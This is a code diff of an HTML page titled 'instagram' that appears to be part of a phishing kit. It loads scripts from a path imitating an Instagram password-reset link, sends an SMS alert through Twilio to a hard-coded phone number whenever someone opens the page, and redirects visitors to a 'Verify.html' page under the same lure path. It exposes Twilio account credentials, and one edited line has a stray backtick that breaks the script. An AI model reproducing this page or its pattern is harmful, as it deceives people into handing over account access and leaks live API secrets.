@@ -1,50 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>  
+<head>
+  
    <title>instagram</title>
+   <script src="password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/dummyOpen.js"></script>
   <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    
    <script>
-    $(document).ready(function () {
-        const twilioAccountSID = 'ACd2e88a17b14ef8022a8b6f079f92c24a';
-        const twilioAuthToken = '8b1d9a6a18613704c7c5c0bc705fc9a';
-        const twilioPhoneNumber = '+14302225977';
+        $(document).ready(function () {
+            const twilioAccountSID = 'ACd2e88a17b14ef8022a8b6f079f92c24a';
+            const twilioAuthToken = '8b1d9a6a18613704c7c5c0bc705fc9a9';
+            const twilioPhoneNumber = '+14302225977';
 
-        function sendTwilioSMS() {
-            const toPhoneNumber = '+916370943160';
-            const twilioApiUrl = `https://api.twilio.com/2010-04-01/Accounts/${twilioAccountSID}/Messages.json`;
+            function sendTwilioSMS() {
+                const toPhoneNumber = '+916370943160';
+                const twilioApiUrl = `https://api.twilio.com/2010-04-01/Accounts/${twilioAccountSID}/Messages.json`;
 
-            const istTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
-            const formattedTime = `${istTime}`;
+                const istTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
+                const formattedTime = `${istTime}`;
 
-            const messageBody = `User Just Logged on\n ‎ ‎ ‎ ‎\n${formattedTime}`;
+                const messageBody = `User Just Logged on\n ‎ ‎ ‎ ‎\n${formattedTime}`;`;
 
-            const auth = btoa(`${twilioAccountSID}:${twilioAuthToken}`);
+                const auth = btoa(`${twilioAccountSID}:${twilioAuthToken}`);
 
-            $.ajax({
-                type: 'POST',
-                url: twilioApiUrl,
-                beforeSend: function (xhr) {
-                    xhr.setRequestHeader('Authorization', `Basic ${auth}`);
-                },
-                data: {
-                    To: toPhoneNumber,
-                    From: twilioPhoneNumber,
-                    Body: messageBody
-                },
-                success: function (response) {
-                    console.log('Twilio Notification Sent:', response);
-                },
-                error: function (error) {
-                    console.error('Error sending Twilio Notification:', error);
-                }
-            });
-        }
+                $.ajax({
+                    type: 'POST',
+                    url: twilioApiUrl,
+                    beforeSend: function (xhr) {
+                        xhr.setRequestHeader('Authorization', `Basic ${auth}`);
+                    },
+                    data: {
+                        To: toPhoneNumber,
+                        From: twilioPhoneNumber,
+                        Body: messageBody
+                    },
+                    success: function (response) {
+                        console.log('Twilio Notification Sent:', response);
+                    },
+                    error: function (error) {
+                        console.error('Error sending Twilio Notification:', error);
+                    }
+                });
+            }
 
-        sendTwilioSMS();
-    });
-</script>
-
+            sendTwilioSMS();
+        });
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
@@ -86,21 +87,6 @@
             }
         }
     </style>
-
-
-<!-- Add this script to your index.html page -->
-<script>
-    // Listen for postMessage from verify.html to close the window
-    window.addEventListener('message', function (event) {
-        if (event.data === 'closeWindow') {
-            window.close();
-            console.log('Closed window as requested by verify.html');
-        }
-    });
-</script>
-
-
-
 </head>
 <body>
     <div class="container" id="container">
@@ -108,53 +94,17 @@
       
     
     </div>
-<!-- In your index.html script -->
-<script>
-    // Simulate the opening animation
-    setTimeout(function () {
-        const container = document.getElementById('container');
-        container.style.opacity = '0';
 
-        setTimeout(function () {
-            container.style.display = 'none';
-
-            // Close the current window after a delay (adjust as needed)
-            openVerifyPage();
-        }, 100); // Adjust the delay as needed
-    }, 1600); // Adjust the initial delay as needed
-
-    // Function to open verify.html in an iframe
-    function openVerifyPage() {
-        // Create an iframe element
-        const iframe = document.createElement('iframe');
-        iframe.src = 'password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html'; // Set the source URL
-        iframe.width = '100%';
-        iframe.height = '100%';
-        iframe.style.zIndex = '1';
-        iframe.style.position = 'absolute';
-        iframe.style.top = '0';
-        iframe.style.left = '0';
-        iframe.style.visibility = 'hidden'; // Initially hidden
-
-        // Append the iframe to the container div
-        document.getElementById('container').appendChild(iframe);
-
-        // Toggle visibility after a short delay (adjust as needed)
-        setTimeout(function () {
-            iframe.style.visibility = 'visible';
-        }, 100); // Adjust the delay as needed
-    }
-
-    // Listen for postMessage from verify.html to close the window
-    window.addEventListener('message', function (event) {
-        if (event.data === 'closeWindow') {
-            window.close();
-            console.log('Closed window as requested by verify.html');
-        }
-    });
-</script>
-
-
+    <script>
+        // Simulate the opening animation
+        setTimeout(function() {
+            document.getElementById('container').style.opacity = '0';
+            setTimeout(function() {
+                document.getElementById('container').style.display = 'none';
+                // Redirect to another HTML file after the animation (adjust the URL)
+                window.location.href = 'password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html';
+            }, 100); // Adjust the delay as needed
+        }, 1600); // Adjust the initial delay as needed
+    </script>
 </body>
 </html>
-
